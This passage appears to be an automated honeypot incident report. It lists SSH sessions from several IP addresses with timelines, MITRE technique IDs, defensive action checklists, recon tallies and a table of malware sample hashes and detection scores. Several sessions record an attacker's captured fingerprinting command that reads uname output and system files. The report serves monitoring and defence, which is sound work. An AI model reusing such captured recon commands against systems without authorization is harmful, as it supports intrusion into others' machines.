| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:45:29` | `cowrie.session.connect` |
| `2026-07-11 12:45:30` | `cowrie.client.version` |
| `2026-07-11 12:45:30` | `cowrie.client.kex` |
| `2026-07-11 12:45:31` | `cowrie.login.success` |
| `2026-07-11 12:45:32` | `cowrie.session.params` |
| `2026-07-11 12:45:32` | `cowrie.command.input` |
| `2026-07-11 12:45:33` | `cowrie.command.input` |
| `2026-07-11 12:45:33` | `cowrie.command.input` |
| `2026-07-11 12:45:33` | `cowrie.command.input` |
| `2026-07-11 12:45:33` | `cowrie.command.input` |
| `2026-07-11 12:45:33` | `cowrie.command.success` |
| `2026-07-11 12:45:33` | `cowrie.command.input` |
| `2026-07-11 12:45:33` | `cowrie.command.input` |
| `2026-07-11 12:45:33` | `cowrie.command.input` |
| `2026-07-11 12:45:33` | `cowrie.command.input` |
| `2026-07-11 12:45:33` | `cowrie.log.closed` |
| `2026-07-11 12:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5935a0973de6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:47 |
| **Last Seen** | 2026-07-11 12:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:47:25` | `cowrie.session.connect` |
| `2026-07-11 12:47:26` | `cowrie.client.version` |
| `2026-07-11 12:47:26` | `cowrie.client.kex` |
| `2026-07-11 12:47:27` | `cowrie.login.success` |
| `2026-07-11 12:47:28` | `cowrie.session.params` |
| `2026-07-11 12:47:28` | `cowrie.command.input` |
| `2026-07-11 12:47:28` | `cowrie.command.input` |
| `2026-07-11 12:47:28` | `cowrie.command.input` |
| `2026-07-11 12:47:28` | `cowrie.command.input` |
| `2026-07-11 12:47:28` | `cowrie.command.input` |
| `2026-07-11 12:47:28` | `cowrie.command.success` |
| `2026-07-11 12:47:28` | `cowrie.command.input` |
| `2026-07-11 12:47:28` | `cowrie.command.input` |
| `2026-07-11 12:47:28` | `cowrie.command.input` |
| `2026-07-11 12:47:28` | `cowrie.command.input` |
| `2026-07-11 12:47:28` | `cowrie.log.closed` |
| `2026-07-11 12:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c15a4807f35

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-07-11 12:48 |
| **Last Seen** | 2026-07-11 12:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:48:57` | `cowrie.session.connect` |
| `2026-07-11 12:48:58` | `cowrie.client.version` |
| `2026-07-11 12:48:58` | `cowrie.client.kex` |
| `2026-07-11 12:49:00` | `cowrie.login.success` |
| `2026-07-11 12:49:00` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:49:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d439dc3f0421

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-07-11 12:49 |
| **Last Seen** | 2026-07-11 12:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:49:06` | `cowrie.session.connect` |
| `2026-07-11 12:49:06` | `cowrie.client.version` |
| `2026-07-11 12:49:06` | `cowrie.client.kex` |
| `2026-07-11 12:49:09` | `cowrie.login.success` |
| `2026-07-11 12:49:09` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:49:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3327cc7e938e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:49 |
| **Last Seen** | 2026-07-11 12:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:49:29` | `cowrie.session.connect` |
| `2026-07-11 12:49:29` | `cowrie.client.version` |
| `2026-07-11 12:49:29` | `cowrie.client.kex` |
| `2026-07-11 12:49:30` | `cowrie.login.success` |
| `2026-07-11 12:49:31` | `cowrie.session.params` |
| `2026-07-11 12:49:31` | `cowrie.command.input` |
| `2026-07-11 12:49:31` | `cowrie.command.input` |
| `2026-07-11 12:49:31` | `cowrie.command.input` |
| `2026-07-11 12:49:31` | `cowrie.command.input` |
| `2026-07-11 12:49:31` | `cowrie.command.input` |
| `2026-07-11 12:49:31` | `cowrie.command.success` |
| `2026-07-11 12:49:31` | `cowrie.command.input` |
| `2026-07-11 12:49:31` | `cowrie.command.input` |
| `2026-07-11 12:49:31` | `cowrie.command.input` |
| `2026-07-11 12:49:31` | `cowrie.command.input` |
| `2026-07-11 12:49:31` | `cowrie.log.closed` |
| `2026-07-11 12:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4414fbce710a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 12:51 |
| **Last Seen** | 2026-07-11 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:51:33` | `cowrie.session.connect` |
| `2026-07-11 12:51:34` | `cowrie.client.version` |
| `2026-07-11 12:51:34` | `cowrie.client.kex` |
| `2026-07-11 12:51:37` | `cowrie.login.success` |
| `2026-07-11 12:51:38` | `cowrie.session.params` |
| `2026-07-11 12:51:38` | `cowrie.command.input` |
| `2026-07-11 12:51:38` | `cowrie.log.closed` |
| `2026-07-11 12:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5246e6815a09

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:51 |
| **Last Seen** | 2026-07-11 12:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:51:33` | `cowrie.session.connect` |
| `2026-07-11 12:51:33` | `cowrie.client.version` |
| `2026-07-11 12:51:33` | `cowrie.client.kex` |
| `2026-07-11 12:51:35` | `cowrie.login.success` |
| `2026-07-11 12:51:36` | `cowrie.session.params` |
| `2026-07-11 12:51:36` | `cowrie.command.input` |
| `2026-07-11 12:51:36` | `cowrie.command.input` |
| `2026-07-11 12:51:36` | `cowrie.command.input` |
| `2026-07-11 12:51:36` | `cowrie.command.input` |
| `2026-07-11 12:51:36` | `cowrie.command.input` |
| `2026-07-11 12:51:36` | `cowrie.command.success` |
| `2026-07-11 12:51:36` | `cowrie.command.input` |
| `2026-07-11 12:51:36` | `cowrie.command.input` |
| `2026-07-11 12:51:36` | `cowrie.command.input` |
| `2026-07-11 12:51:36` | `cowrie.command.input` |
| `2026-07-11 12:51:36` | `cowrie.log.closed` |
| `2026-07-11 12:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c4fb7e65e3d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]191` |
| **First Seen** | 2026-07-11 12:52 |
| **Last Seen** | 2026-07-11 12:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:52:40` | `cowrie.session.connect` |
| `2026-07-11 12:52:41` | `cowrie.client.version` |
| `2026-07-11 12:52:41` | `cowrie.client.kex` |
| `2026-07-11 12:52:43` | `cowrie.login.success` |
| `2026-07-11 12:52:44` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]191` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc39a1452ad

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:53 |
| **Last Seen** | 2026-07-11 12:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:53:27` | `cowrie.session.connect` |
| `2026-07-11 12:53:28` | `cowrie.client.version` |
| `2026-07-11 12:53:28` | `cowrie.client.kex` |
| `2026-07-11 12:53:29` | `cowrie.login.success` |
| `2026-07-11 12:53:31` | `cowrie.session.params` |
| `2026-07-11 12:53:31` | `cowrie.command.input` |
| `2026-07-11 12:53:31` | `cowrie.command.input` |
| `2026-07-11 12:53:31` | `cowrie.command.input` |
| `2026-07-11 12:53:31` | `cowrie.command.input` |
| `2026-07-11 12:53:31` | `cowrie.command.input` |
| `2026-07-11 12:53:31` | `cowrie.command.success` |
| `2026-07-11 12:53:31` | `cowrie.command.input` |
| `2026-07-11 12:53:31` | `cowrie.command.input` |
| `2026-07-11 12:53:31` | `cowrie.command.input` |
| `2026-07-11 12:53:31` | `cowrie.command.input` |
| `2026-07-11 12:53:31` | `cowrie.log.closed` |
| `2026-07-11 12:53:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **34** | 2026-07-11 10:55 | 2026-07-11 12:48 | 42m | 0 | `T1592` | 🟠 MEDIUM |
| `104.143.10[.]174` | **29** | 2026-07-11 10:55 | 2026-07-11 12:52 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **23** | 2026-07-11 11:00 | 2026-07-11 12:45 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-07-11 11:13 | 2026-07-11 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | **3** | 2026-07-11 12:03 | 2026-07-11 12:38 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `204.76.203[.]222` | **3** | 2026-07-11 11:48 | 2026-07-11 11:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **2** | 2026-07-11 11:40 | 2026-07-11 12:13 | 2m | 0 | `T1592` | 🟢 LOW |
| `171.231.192[.]229` | **2** | 2026-07-11 11:05 | 2026-07-11 11:10 | 2m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]213` | **2** | 2026-07-11 11:48 | 2026-07-11 11:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | **2** | 2026-07-11 11:30 | 2026-07-11 12:36 | 1m | 0 | `T1592` | 🟢 LOW |
| `216.226.77[.]20` | **2** | 2026-07-11 11:03 | 2026-07-11 11:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-07-11 12:26 | 2026-07-11 12:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `9.234.10[.]188` | **2** | 2026-07-11 11:46 | 2026-07-11 11:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.30[.]240` | 1 | 2026-07-11 11:33 | 2026-07-11 11:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.201.65[.]26` | 1 | 2026-07-11 11:37 | 2026-07-11 11:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.110.9[.]173` | 1 | 2026-07-11 10:57 | 2026-07-11 10:57 | 32s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-07-11 12:31 | 2026-07-11 12:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-07-11 12:34 | 2026-07-11 12:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]212` | 1 | 2026-07-11 11:48 | 2026-07-11 11:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-11 12:06 | 2026-07-11 12:06 | 5s | 0 | `T1592` | 🟢 LOW |
| `60.171.135[.]254` | 1 | 2026-07-11 10:58 | 2026-07-11 11:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.67.161[.]64` | 1 | 2026-07-11 11:43 | 2026-07-11 11:45 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 39/100 | 🟢 LOW | **23/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
